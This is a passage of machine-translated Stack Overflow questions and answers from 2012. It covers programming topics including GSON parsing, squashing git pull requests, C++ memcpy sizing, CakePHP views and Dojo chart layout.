无论如何，我真的不明白你为什么坚持通过 GQL 进行查询。通过键获取对象的方法是直接使用`get`：

```
contract = db.get(contract_key) 
```

对于密钥 ID：

```
contract = Contract.get_by_id(id) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:50:19.513

也许这不是您正在寻找的答案，但您可以试试这个：

```
contract_record = Contract(book_number = 42, initial_page = 420, final_page = 442)
contract_record.put()
contract_key = contract_record.key()
contract = db.get(contract_key) 
```

# c# - 保存前设置图像元数据

> ID：11396050
> 
> 赞同：1
> 
> 时间：2012-07-09T13:30:32.390
> 
> 标签：c#, image, gdi

我试图在从调整大小退出时设置图像的元数据，该属性似乎已设置，但在保存后什么都没有。

我很确定我在做一些愚蠢的事情。

```
var pi = createPropertyItem();

pi.Id = 40091;
pi.Len = "SomeText".Length;
pi.Type = 2;
pi.Value = Encoding.UTF8.GetBytes("SomeText");
SrcImage.SetPropertyItem(pi);
SrcImage.Save(@"C:\temp\withTag.jpg");

private PropertyItem createPropertyItem()
{
   var ci = typeof (PropertyItem);
   var o = ci.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance |    BindingFlags.Public , null, new Type[] {} , null);

    return (PropertyItem)o.Invoke(null);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:55:10.880

好吧，经过一些测试，这可行……但前提是原始图像中不存在属性 40091。如果它存在，它不会被替换（必须承认我不知道为什么）。

```
 var image = Image.FromFile(@"C:\Tools\test.jpg");
 var propertyItem = createPropertyItem();
 var text = "awe" + char.MinValue;//add \0 at the end of your string
 propertyItem = createPropertyItem();
 propertyItem.Id = 40091;
 propertyItem.Value = Encoding.Unicode.GetBytes(text);//change to Unicode
 propertyItem.Len = propertyItem.Value.Length;
 propertyItem.Type = 1;//it's not type 2 !
 image.SetPropertyItem(propertyItem);
 image.Save(@"C:\Tools\test2.jpg"); 
```

# asp.net - 如何避免文本重叠 标记 & 设置高度 如果 Text in 则自动标记 更多？

> ID：11396053
> 
> 赞同：0
> 
> 时间：2012-07-09T13:30:37.800
> 
> 标签：asp.net, html, css

我在asp.net 的Repeater 控件中有一个**DIV**标签。当它们的文本较少时，它会显示得很好。但是，当 DIV 中的**Text 增加时，它必须在 DIV 中进行 AutoAdjusted**。但是，它与Repeater Control 中的下一行DIV 重叠。

如何设置它以便它应该在 DIV 中获得自我调整高度？

在 Style.css 文件中：

```
.UserControlDiv
{ 
    height: 45px;     
    float: left;  
}

 <div style="width:380px;" class="UserControlDiv">
                <%# Eval("Address")%>
 </div>
 <div style="width:380px;" class="UserControlDiv">
                <%# Eval("UnicodeAddress")%>
 </div> 
```

使用上面的 CSS，地址中的文本与下一行重叠。帮助赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:34:36.763

尝试使用“最小高度”：

```
.UserControlDiv
{ 
    min-height: 45px;     
    float: left;  
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:39:25.180

如果每 2 个 div 需要单独的行，则可以将模板包装到另一个 div 中。

```
<style>
.row
{
    clear:both;
    min-height:45px;    
}

.UserControlDiv
{     
    float: left;  
}
</style>

<div class='row'>
    <div style="width:380px;" class="UserControlDiv">
                  <%# Eval("Address")%>

    </div>
    <div style="width:380px;" class="UserControlDiv">
                   <%# Eval("UnicodeAddress")%>
    </div>
</div> 
```

# java - Android SDK：使用 GSON 从 URL 解析 JSON

> ID：11396055
> 
> 赞同：3
> 
> 时间：2012-07-09T13:30:38.217
> 
> 标签：java, android, json, gson

我正在尝试从 URL 解析 JSON，然后将数据添加到数组中。我正在使用 GSON 库。

我的 JSON 格式如下：

```
[
   {
      "img-src":"http://website.com/images/img1.png",
      "URL":"http://google.com"
   },
   {
      "img-src":"http://website.com/images/img2.jpg",
      "URL":"http://yahoo.com"
   }
] 
```

我想在一个单独的线程中获取上述数据，我有以下代码：

```
public class Async extends AsyncTask<String, Integer, Object>{

        @Override
        protected String doInBackground(String... params) {

            return null;
        }

    } 
```

如何获取每个“img-src”和“URL”值？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T13:47:55.253

使用此方法在数组列表中获取您的数据

```
 public ArrayList<NewsItem> getNews(String url) {
    ArrayList<NewsItem> data = new ArrayList<NewsItem>();

    java.lang.reflect.Type arrayListType = new TypeToken<ArrayList<NewsItem>>(){}.getType();
    gson = new Gson();

    httpClient = WebServiceUtils.getHttpClient();
    try {
        HttpResponse response = httpClient.execute(new HttpGet(url));
        HttpEntity entity = response.getEntity();
        Reader reader = new InputStreamReader(entity.getContent());
        data = gson.fromJson(reader, arrayListType);
    } catch (Exception e) {
        Log.i("json array","While getting server response server generate error. ");
    }
    return data;
} 
```

这应该是你应该如何声明你的 ArrayList Type 类（这里是它的 NewsItem）

```
 import com.google.gson.annotations.SerializedName;
    public class NewsItem   {

@SerializedName("title")
public String title;

@SerializedName("content")
public String title_details;

@SerializedName("date")
public  String date;

@SerializedName("featured")
public String imgRawUrl; 

} 
```

这是 WebSERvice 实用程序类。

```
public class WebServiceUtils {

 public static HttpClient getHttpClient(){
        HttpParams httpParameters = new BasicHttpParams();
        // Set the timeout in milliseconds until a connection is established.
        int timeoutConnection = 50000;
        HttpConnectionParams.setConnectionTimeout(httpParameters, timeoutConnection);
        // Set the default socket timeout (SO_TIMEOUT) 
        // in milliseconds which is the timeout for waiting for data.
        int timeoutSocket = 50000;
        HttpConnectionParams.setSoTimeout(httpParameters, timeoutSocket);           
        HttpClient httpclient = new DefaultHttpClient(httpParameters);          
        return httpclient;
     }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:44:52.910

在本用户指南中，您可以找到很多示例：

[https://sites.google.com/site/gson/gson-user-guide](https://sites.google.com/site/gson/gson-user-guide)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:35:27.463

这就是我使用的代码（对我来说效果很好）。

```
//Initialize the list
Type listType = new TypeToken<ArrayList<YourObject>>(){}.getType();
//Parse
List<YourObject> List= new Gson().fromJson(response, listType); 
```

YourObject 应该是这样的：

```
public class Category {
    private String URL;
    private String img-src;

    public Category(String URL, String img-src){
        this.URL= URL;
        this.img-src= img-src;
    }
} 
```

问候。

Ps：这样你会得到一个“YourObject”的列表。然后您可以创建以列出一个与 URL 和其他与 img-src

# mobile - 如何监控本地 IIS 服务器的外部流量？

> ID：11396057
> 
> 赞同：0
> 
> 时间：2012-07-09T13:30:39.700
> 
> 标签：mobile, iis-7.5, fiddler

我正在为移动设备开发并调试我将 WIFI 上的设备连接到我的 IP 地址。它适用于在我的机器上进行硬件开发和调试。我唯一不能工作的是如何设置 Fiddler 以便它看到来自外部客户端的流量？

如果我从同一台机器上的浏览器打开我的网站 - 提琴手得到它。但是当我从另一台机器通过 IP 地址连接到我的电脑时 - fiddler 看不到它。

我有正确的设置（我认为）

![在此处输入图像描述](../Images/4cad2119c2cde7dc4e480f4f3692ce37.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T16:31:49.330

您需要将 Fiddler 配置为反向代理。请参阅[使用 Fiddler 作为反向代理](http://fiddler2.com/documentation/Configure-Fiddler/Tasks/UseFiddlerAsReverseProxy)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-04T22:35:32.780

我通过简单地更改 IIS 应用程序池来使其工作，我想检查其流量以我的身份运行，因为 Fiddler 似乎默认只捕获登录用户的流量。只需确保您的用户拥有 IIS 所需的所有必要权限即可；我是管理员，所以这对我来说不是问题。当然，完成后不要忘记将 IIS 应用程序池标识改回来。

当然，另一种选择是以运行 IIS 应用程序池的用户身份登录（如果它不是类似的服务帐户`Network Service`），然后在以其他用户身份登录时运行 Fiddler。

# ios - 这两个 iOS UI 自动化框架有什么区别？

> ID：11396065
> 
> 赞同：0
> 
> 时间：2012-07-09T13:31:06.610
> 
> 标签：ios, ios-ui-automation

有两个第三方框架用于处理 iOS UI 自动化工具：Alex Volmer 的 tuneup.js 和 Jasmine 框架。

这两个框架之间有什么区别，它们的优缺点是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-03T00:27:08.973

tuneup.js 和 Jasmine 都为 UIAutomation 相当冗长和艰巨的断言 API 提供了很好的包装器。

tuneup.js 的一个优点是它不仅包括测试/断言抽象，而且还包括许多方便的便捷方法，用于在 UIAutomation 中执行各种常见任务（例如，在文本字段中键入文本）。tuneup.js 的缺点（与 Jasmine 相比）是它缺乏 Jasmine 通过嵌套`describe`/`it`规范定义提供的一些很好的描述。

如上所述，Jasmine 提供了一种丰富的方式来定义应用程序的各种规格。您可以很容易地划分各种测试。此外，如果您在常规 ol' Javascript 测试中使用过 Jasmine，那么它会非常熟悉。

无论哪种情况，如果您的应用程序甚至具有较深的元素层次结构，我建议将 tuneup 或 Jasmine 与我自己的框架[mechanic.js](http://www.github.com/jaykz52/mechanic)配对。Mechanic 使遍历应用程序的“DOM”并与元素交互变得非常容易。普通的 UIAutomation 可能有点冗长；mechanic 有点像 UIAutomation 的 JQuery。

无论如何，在大多数情况下，我个人的选择是 Jasmine + Mechanic。我更喜欢 Jasmine 的规范定义 API 的节奏，并与 Mechanic 搭配使用，可以进行简洁易读的 UI 测试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-24T22:21:02.840

Jasmine 和 tuneup.js 都为您提供了类似的简单语法来编写您的 iOS 自动化测试。

Jasmine 的一个优点是它具有良好的报告结构，因此如果您计划从 Jenkins 或 Hudson 等 CI 服务器运行自动化测试，那么您的 CI 服务器解析来自 Jasmine 的 XML 测试结果会容易得多。使用 tuneup.js 时获得的 .plist 格式

# git - 为 github 拉取请求压缩到只有一个“正确”提交

> ID：11396069
> 
> 赞同：46
> 
> 时间：2012-07-09T13:31:22.207
> 
> 标签：git, github, pull-request

我在 github 上有一个 repo，其他人（Bob，为了争论）已经发出了拉取请求。他的代码并不完美，所以我们进行了几轮标记。据我了解，他为每组标记的更改提交并推送他的拉取请求。

所以我的存储库现在看起来像这样：

```
master: ---o A (Chowlett
           |
           |
pull-req:  o---o---o---o
               B   C   D (all Bob) 
```

提交 SHA 和消息如下：

A：

```
123456 Good commit <chowlett> 
```

乙：

```
777ccc Fix the widget bug <bob> 
```

C：

```
888ddd Review markups <bob> 
```

丁：

```
999eee Further markups <bob> 
```

我现在很高兴接受这个拉取请求；但我宁愿预标记版本不在我的仓库中。我可以实现以下所有目标吗？如何？

*   将 B、C 和 D 合并到我的仓库中作为单个提交
*   生成“Merge pull request #99 into ...”提交
*   让 github 自动关闭拉取请求

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2016-04-02T18:51:29.543

请注意，Bob 在进行 GitHub PR 时不必压缩他的提交。
自 2016 年 3 月起，您可以将该操作留给接受 PR 的维护者（您）。

请参阅“ [Squash your commits](https://github.com/blog/2141-squash-your-commits) ”及其[新文档](https://help.github.com/articles/about-pull-request-merge-squashing/)

> 这是一个新选项，可让您对通过合并按钮合并的所有拉取请求强制提交压缩。

[![https://help.github.com/assets/images/help/pull_requests/squash-and-merge.png](../Images/6c33f82dfd00c26ed002b545f6e29377.png)](https://i.stack.imgur.com/cyHZY.png)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-05-13T03:24:51.740

有两个内置的“壁球”功能`git`。有`git merge --squash`而且有`squash`动作`git rebase --interactive`。前者不保留任何作者或日期信息，只是将一系列提交中的所有更改收集到本地工作副本中。后者很烦人，因为它需要交互。

[`git squash`扩展](https://github.com/jnothman/git-squash)做你想要的。它将当前 HEAD 重新设置为指定的基础，同时自动压缩其间的提交。它还提供了一个命令行选项，用于在 rebase 不会产生冲突的情况下在最终压扁的提交上设置消息。

[`hub`](http://defunkt.io/hub/)将其与and一起使用[`ghi`](https://github.com/stephencelis/ghi)，您也许可以按照以下方式构建一个脚本：

```
git pull upstream master
hub checkout https://github.com/$user/$repo/pull/$issue
git squash master
rev=$(git rev-parse --short HEAD)
git checkout master
git merge $rev
git commit --amend "Merged pull request #$issue"
git push upstream master
ghi close $issue $user/$repo
ghi comment $issue "Merged as $rev" $user/$repo 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-07-31T17:41:26.367

您可以使用 --squash 选项进行合并

```
git merge <remote url> <remote branch> --squash 
```

但是，这不会产生合并提交。相反，它将产生一组正常的工作树更改，就像您手动将他的所有更改应用于您的副本一样。然后你会像往常一样提交。

缺点是您在 master 上的历史不会将此提交显示为来自他的分支的合并。看起来就像您自己完成了工作，而不是给 Bob 信用。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-12-23T20:56:07.183

## 使用 git rebase

一种想法是检查分支并使用迭代变基将所有提交压缩为一个，然后强制推送以更新拉取请求并合并（尽管这项工作的一部分可以委托给 Bob）。

要自动将分支中的所有提交压缩到第一个提交并将其应用于拉取请求，您可以使用以下命令：

```
$ git checkout pull-req
$ GIT_SEQUENCE_EDITOR='sed -i "2,\$s/^pick/s/g" $1' git rebase -i origin/master
$ git push --force 
```

[GIT_SEQUENCE_EDITOR](http://git.kernel.org/cgit/git/git.git/commit/?id=821881d88d3012a64a52ece9a8c2571ca00c35cd)是一个 Git 环境变量，用于为变基提交列表设置临时编辑器。我们将它设置为一个内联脚本，它在除第一行（即模式中的 the ）之外的所有行的开头`pick`用`s`(meaning ) 替换单词。传递给脚本的提交列表是一个简单的文本文件。然后 Git 继续进行变基并让您编辑最终的提交消息。`squash``2,\$``sed`

此外，使用 git 钩子，您可以或多或少地轻松编辑此最终消息以满足您的需要（例如在压缩的提交消息之间添加一个视觉分隔符）。

## 使用 git merge --squash

挤压也可以通过`git merge --squash`. 请参阅[此处](https://stackoverflow.com/questions/2427238/in-git-what-is-the-difference-between-merge-squash-and-rebase)了解两种方法之间的区别。下面的脚本将使用 merge 命令将分支的提交压缩为单个提交。它还创建分支的备份（以防万一）。

```
MAINBRANCH="master"    
CURRENT_BRANCH=$(git rev-parse --abbrev-ref HEAD)

# update current feature branch with master
git pull origin $MAINBRANCH

# delete existing backup
git branch -D "$CURRENT_BRANCH-backup"

# backup current feature branch and go back
git checkout -b "$CURRENT_BRANCH-backup" && git checkout -

# checkout and update master branch
git checkout $MAINBRANCH && git pull

# create new branch from master
git checkout -b "$CURRENT_BRANCH-squashed"

# set it to track the corresponding feature branch
git branch "$CURRENT_BRANCH-squashed" --set-upstream-to "$CURRENT_BRANCH"

# merge and squash the feature branch into the one created
git merge --squash $CURRENT_BRANCH

# commit the squashed changes
git commit

# force push to the corresponding feature branch
git push -f . HEAD:$CURRENT_BRANCH

# checkout the feature branch
git checkout $CURRENT_BRANCH

# delete the squashed copy
git branch -D "$CURRENT_BRANCH-squashed" 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-11-28T13:42:56.893

这对我有用。

*   我的工作`devtools_import_export`保持不变。
*   我对上游/主服务器的拉取请求`issue35squashed`只有一个提交。
*   唉，没有记录合并，但提交消息包含所有详细信息。

这是我实际所做的（参见[https://github.com/anaran/devtools-snippets/network](https://github.com/anaran/devtools-snippets/network)）

```
git checkout master
git status # all clean
git checkout -B issue35squashed master
git merge --squash devtools_import_export
git status # looks good
git commit # review and commit via emacs
git log --graph --abbrev-commit --stat --pretty --decorate=full --branches
git push --all -v 
```

（我之前使用的尝试`git merge --no-ff ...`是 in`issue35take2`并且它的拉取请求包含来自 . 的所有个人提交`devtools_import_export`。不好。）

# iphone - 使用 phonegap 将电话号码和电子邮件添加到 iOS 中的联系人

> ID：11396070
> 
> 赞同：0
> 
> 时间：2012-07-09T13:31:27.480
> 
> 标签：iphone, ios, ipad, cordova

如何使用cordova框架（phonegap）将电话号码添加到iOS中的联系人？我已经尝试过使用 href:tel 但它不起作用！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:41:16.117

这是一些代码：

```
var contact = navigator.contacts.create();
contact.displayName = "Plumber";
var name = new ContactName();
name.givenName = "Jane";
name.familyName = "Doe";
contact.name = name;

// phone numbers
var phoneNumbers = [];
phoneNumbers[0] = new ContactField('work', '212-555-1234', false);
phoneNumbers[1] = new ContactField('mobile', '917-555-5432', true);
phoneNumbers[2] = new ContactField('home', '203-555-7890', false);
contact.phoneNumbers = phoneNumbers;

// save
contact.save(onSaveSuccess,onSaveError); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:42:38.107

```
<a href="tel:..."> 
```

仅添加一个链接以打开呼叫窗口，它不会将号码或电子邮件保存到设备。

您需要添加特定代码以插入更新联系人：

[http://docs.phonegap.com/en/1.9.0/cordova_contacts_contacts.md.html#contacts.create](http://docs.phonegap.com/en/1.9.0/cordova_contacts_contacts.md.html#contacts.create)

# iphone - iOS 的 OTA 分发 - 对 iOS 4 无效

> ID：11396076
> 
> 赞同：0
> 
> 时间：2012-07-09T13:31:42.443
> 
> 标签：iphone, ios, ota

你好。

我对 iOS 的 OTA 分发有一点问题。事实上，它完全适用于 iOS 5 及更高版本，但当我在 iOS 4 设备上尝试时，什么也没有发生。当我什么都不说时，这不是说“它不起作用”的方式。没有弹出窗口，没有错误消息（甚至警告消息）......但我确信我读过带有 plist/ipa 文件的 OTA 分发在 iOS 4 中工作正常。

我使用这个链接：

```
<a href="itms-services://?action=download-manifest&url=http://169.254.38.148/Project/DL/dl-6+Testing-98+.html">Testing-98</a> 
```

再一次，它可以在 iOS 5 上运行，所以...... :(

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T16:51:08.830

你知道[iOS 的 BetaBuilder](http://itunes.apple.com/us/app/betabuilder-for-ios-apps/id415348946?mt=12)吗？在 iOS 4 及更高版本中，它就像一个魅力。让我的生活轻松了很多！

# android - android地图应用程序正在模拟器上运行，但不在设备上

> ID：11396086
> 
> 赞同：2
> 
> 时间：2012-07-09T13:32:23.090
> 
> 标签：android, google-maps, android-emulator

我在 Eclipse 中开发了一个 android 地图应用程序并在模拟器上对其进行了测试，它在模拟器上运行良好，但是当我测试它时，没有显示任何设备，但地图没有加载，只显示空白图块。请帮助我摆脱这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:03:31.323

如果您使用不同的密钥为您的手机签署应用程序，您需要从该密钥生成一个新的 MD5 指纹并为您的应用程序生成一个新的地图 API 密钥

[获取 Google Maps Android API 密钥](https://developers.google.com/maps/documentation/android/mapkey)

# java - 使用按钮递增变量

> ID：11396091
> 
> 赞同：0
> 
> 时间：2012-07-09T13:32:46.030
> 
> 标签：java, android

我制作了一个简单的计数器程序，在其中单击加号或减号按钮，它会从计数器中添加或删除 1。

我希望能够添加更多计数器：例如。counter1、counter2、counter3 等。这是我现在如何使用 2 个计数器的示例，但是正如您所看到的，我已经声明了我的变量，我想自动生成它们

```
int counter, counter2;
ImageButton add, sub, add2, sub2, btnSet;
TextView display, display2; 
```

这就是我使用加号按钮的方式

```
// Plus button setup
    add.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            counter++;
            display.setText(""+counter);
            Vibrator vibr = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

            vibr.vibrate (20); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:41:11.193

您可以创建一个包含与增量按钮相关的信息的类：

```
class IncrementButton {
    int step;
    int counter;
    ImageButton add, sub;
    TextView display;

    public IncrementButton(int step) {
        this.step = step;
        add = ...
        sub = ...
        display = ...

        add.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                counter += step;
                display.setText("" + counter);
                Vibrator vibr = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                vibr.vibrate (20);
            }
        }

        ...

    }
} 
```

并将该类的对象放入列表中 - 例如 3 个按钮：

```
List<IncrementButton> buttons = new ArrayList<IncrementButton> ();

for (int i = 0; i < 3; i++) {
    IncrementButton btn = new IncrementButton(i + 1);
    buttons.add(btn);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:43:00.000

创建包含计数器、2 个按钮（用于添加和订阅）和文本视图的赢得小部件，将所有逻辑放在那里（在点击侦听器等...），然后只保留你的多少实例列表想要在你的活动中。

# c++ - c++ memcpy错误

> ID：11396092
> 
> 赞同：2
> 
> 时间：2012-07-09T13:32:55.517
> 
> 标签：c++

我想一个接一个地复制 2 个整数、2 个短裤和 1 个字符。

这就是我所做的：

```
int32_t a=1;
int32_t b=2;
int16_t c=3;
int16_t d=4;
int8_t e=5;
char*buf=new char[104];
memcpy(buf, &a, 32);
memcpy(buf + 32, &b, 32);
memcpy(buf + 64, &c, 16);
memcpy(buf + 80, &d, 16);
memcpy(buf + 96, &e, 8); 
```

这个对吗 ？我的调试器说第三行影响第二行，但也许我只是在滥用我的调试器（更具体地说，它说 *((int32_t*)(buf+32)) 的值在第二个和第三个 memcpy 之间发生了变化） .

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-09T13:35:38.067

您已经混淆了位和字节，并且正在过度读取和覆盖大部分内存！

```
int32_t x; /* 4 bytes, 32 bits */
int16_t y; /* 2 bytes, 16 bits */

memcpy(buf            , &x, sizeof(x)); /* copy 4 BYTES, or sizeof(x) */
memcpy(buf + sizeof(x), &y, sizeof(y)); /* copy 2 bytes */ 
```

因此，您的缓冲区大约是所需大小的 8 倍，并且您每次复制的数据量是所需的 4 倍。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T13:35:55.863

`memcpy`以字节而不是位为单位测量大小。它应该是：

```
memcpy(buf, &a, 4);
memcpy(buf + 4, &b, 4);
memcpy(buf + 8, &c, 2);
memcpy(buf + 10, &d, 2);
memcpy(buf + 12, &e, 1); 
```

# php - 如何通过 $$ 变量从 CakePHP 的控制器中查看？

> ID：11396096
> 
> 赞同：1
> 
> 时间：2012-07-09T13:33:04.627
> 
> 标签：php, cakephp, variables

在 AppController 中：

```
function beforeFilter() {

    $company = 'name of Company';

    $this->set(compact('company'));

} 
```

在控制器类中：

```
function companyinfo() {
    $logo = '<div><?php $this->Html->image('logo'); ?></div>';
    $welcome = 'welcome to $$company!';

    $this->set(compact('logo','welcome'));
}

function beforeFilter() {
    parent::beforeFilter();
} 
```

在视图类中：

```
<html>
    <body>
        <?php echo $logo; ?>
        <?php echo $welcome; ?>
    </body>
</html> 
```

通过控制器从 AppController 传递变量后，它不会在视图中回答变量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:36:03.630

1）当您使用`$this->set(compact('company'));`时，它不会设置用于任何控制器的变量 - 它正在传递`$company`给视图。

2）您正在尝试使用帮助程序（仅在视图中可用）在字符串中编写 PHP 代码

```
$logo = '<div><?php $this->Html->image('logo'); ?></div>'; 
```

3）想要将数据从 AppController 传递到 Controller 到 View 是不寻常的。

您可能想要做的是这样的事情：

```
//App Controller 
function beforeFilter() {
    $company = 'name of Company';
    $this->set(compact('company'));
}

//Controller
function companyinfo() {
    $logo = 'logo';
    $this->set(compact('logo'));
}

//Layout file (or view file, but I assume it's layout since you're getting data in the AppController)
<?php
echo '<div>' . $this->Html->image($logo) . '</div>';
echo "Welcome to " . $company; 
```

我的意思是尽可能以最具建设性的方式（我们都去过那里）。您似乎在为一些通用的 PHP 概念而苦苦挣扎。在您过分沉迷于 CakePHP 之前，我建议您尝试一些关于通用 PHP 的冗长教程——然后当您对它感到完全满意时，再深入研究 CakePHP。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T21:16:07.643

为了让公司进入视图，如果您希望它在整个站点的所有视图中可用，或者如果您只希望它在您设置它的功能的视图中可用，则可以在您的 appcontroller 中设置它。无论哪种方式，您都需要正确使用 set 功能。例如：

`$this->set('company', 'Name of Company');`

或者

```
$company = 'Name of Company';
$this->set('company', $company); 
```

之后，您将能够访问`$company`视图中的变量。

`echo $company;`输出`Name of Company`

至于你对戴夫的问题：

```
<?php $welcome = 'Welcome to $$company'; ?> <html><body><?php echo $welcome; ?></body></html> 
```

将被写为：

```
<html><body><?php echo "Welcome to ". $company; ?></body></html> 
```

但是，您应该真正考虑将[布局](http://book.cakephp.org/2.0/en/views.html#layouts)与 cakephp 一起使用，这样您就不需要`<html>, <head>, <body>, etc.`每个视图文件中的标签

# javascript - Dojo 的图表布局

> ID：11396100
> 
> 赞同：2
> 
> 时间：2012-07-09T13:33:11.943
> 
> 标签：javascript, html, layout, dojo

我在`dojox.charting.chart`HTML 表中使用 Dojo (1.7.3) 的图表组件 ()（我无法更改它，因为它是其他人提供的一种模板，我必须将图表放在未知位置）。

实际上（简化的）HTML 代码可能如下所示：

```
<table class="fit-parent">
 <tbody>
  <tr>
   <td>
    <div id="chart123" class="full-size-chart"></div>
   </td>
  </tr>
 </tbody>
</table> 
```

它的 CSS 是这样的（考虑`full-size-chart`等价于`fit-parent`）：

```
.fit-parent
{
 width: 100%;
 height: 100%;
} 
```

创建图表的代码：

```
<script type="text/javascript">
    require([
            "dojox/charting/Chart",
            "dojox/charting/themes/MiamiNice",
            "dojox/charting/plot2d/Columns",
            "dojo/domReady!"
        ],
        function (Chart, theme, ChartType) {
            var chart = new Chart("chart123");

            chart.setTheme(theme);

            chart.addPlot("default", {
                type: ChartType
            });

            chart.addSeries("Series name", chartData);

            chart.render();
        }
    );
</script> 
```

渲染表插入到其他 Dojo 容器 (`BorderContainer`和`ContentPane`) 中，同时带有标题和边缘面板。网站是用 ASP.NET MVC3 制作的，上面的代码在一个视图页面内，主要布局在`_Layout.cshtml`页面内。

问题是图表大小不正确，它大于页面大小并出现滚动。理想情况下，表格应该适合内容框并根据窗口大小调整大小。

![布局草图](../Images/310a6bf5cda546809b8af0b9295c0891.png)

绿色框是表格（本例中为 2 行）。图表*应该*填满整行（因为 100% 的宽度和高度），表格布局是正确的（它填满了“文档区域”，其他一切都很好）。我的代码/布局有问题吗？请记住，我可以更改 HTML（并使用 CSS 类），但我不能要求他们直接使用 CSS 浮动/位置或使用 CSS“想象”最终布局（可能他们使用简单的 HTML 编辑器或记事本）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T15:25:48.780

图表不支持 CSS 设置的大小，也不支持百分比大小。您应该在创建之前直接在其节点上以像素为单位指定图表大小，或者在创建期间作为第二个和第三个参数。如果您想支持流畅的布局，请为此使用简单的 JavaScript 跟踪代码，并在需要时相应地调整图表大小。

# c# - C# Crystal Reports - 打印选定的报表

> ID：11396106
> 
> 赞同：0
> 
> 时间：2012-07-09T13:33:49.087
> 
> 标签：c#, visual-studio, crystal-reports, report, selected

我在 Visual Studio 2010 工作，并在项目中包含了一份水晶报告。该报告包括客户拥有的所有产品。问题是有成千上万的客户，我需要通过代码打印选定的客户信息。我已经尝试打印与客户 ID 匹配的页码，但有些客户的产品页面不止一页，这会导致页面打印输出……比如 ID 为 100 的客户为 100，但该页面可能适用于客户 91，因为以前客户的一些报告是多页的。我的问题是如何为特定客户打印页面？我已经为此工作了几天，在互联网上找不到任何有用的东西。

感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:46:58.840

根据您的问题，在我看来，您正在返回所有数据，然后尝试通过代码对其进行过滤。就编程和服务器负载而言，更简单的方法是过滤服务器上的数据并只返回您需要的数据。

为此，请在您的报告中使用参数。您可以使用 ClientID 字段作为报告中的参数。然后，您将该值从您的代码传递到您的报告中。然后，您可以创建报告的 PDF 以显示给您的用户。我一直使用这种方法，效果很好。

我找到了这个[链接](https://stackoverflow.com/questions/1006873/passing-parameters-in-crystal-report)让你开始。查看最后一个答案以获得更精确的选项。

# c# - 生成word文档并用html设置方向横向

> ID：11396109
> 
> 赞同：4
> 
> 时间：2012-07-09T13:33:57.357
> 
> 标签：c#, asp.net, html, export-to-word

我尝试使用以下代码生成 word 文档：

```
 HttpContext.Current.Response.Clear();
    HttpContext.Current.Response.Charset = "";

    HttpContext.Current.Response.ContentType = "application/doc";
    HttpContext.Current.Response.AddHeader("Content-Disposition", "attachment; 
    filename=" + DateTime.Now + ".doc");

    var strHTMLContent = new StringBuilder();

    strHTMLContent.Append(
        "<h1 title='Heading' align='Center'style='font-family: verdana; font 
    -size: 80 % ;color: black'><u>Document Heading</u> </h1> ");

    strHTMLContent.Append("<br>");
    strHTMLContent.Append("<table align='Center'>");

    // Row with Column headers
    strHTMLContent.Append("<tr>");
    strHTMLContent.Append("<td style='width:100px; background:# 99CC00'>
   <b>Column1 </b>  </td>");

    strHTMLContent.Append("<td style='width:100px;background:# 99CC00'>
   <b>Column2 </b>  </td>");

    strHTMLContent.Append("<td style='width:100px; background:# 99CC00'>
   <b>Column 3</b></td>");
    strHTMLContent.Append(" </tr> ");

    // First Row Data
    strHTMLContent.Append("<tr>");
    strHTMLContent.Append(
        "<td style='width:100px'></td>");
    strHTMLContent.Append(
        "<td style='width:100px'>b</td>");
    strHTMLContent.Append(
        "<td style='width:100px'>c</td>");
    strHTMLContent.Append("</tr>");

    // Second Row Data
    strHTMLContent.Append("<tr>");
    strHTMLContent.Append(
        "<td style='width:100px'>d</td>");
    strHTMLContent.Append(
        "<td style='width:100px'>e</td>");
    strHTMLContent.Append(
        "<td style='width:100px'>f</td>");
    strHTMLContent.Append("</tr>");

    strHTMLContent.Append("</table>");

    strHTMLContent.Append("<br><br>");
    strHTMLContent.Append(
        "<p align='Center'> Note : This is a dynamically 
                generated word document  </p> ");
    HttpContext.Current.Response.Write(strHTMLContent);
    //  HttpContext.Current.Response.BinaryWrite(strHTMLContent);
    HttpContext.Current.Response.End();
    HttpContext.Current.Response.Flush(); 
```

它工作正常，但我想让它成为横向和打印布局，因为它出现在 Web 布局中有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-10T13:18:09.710

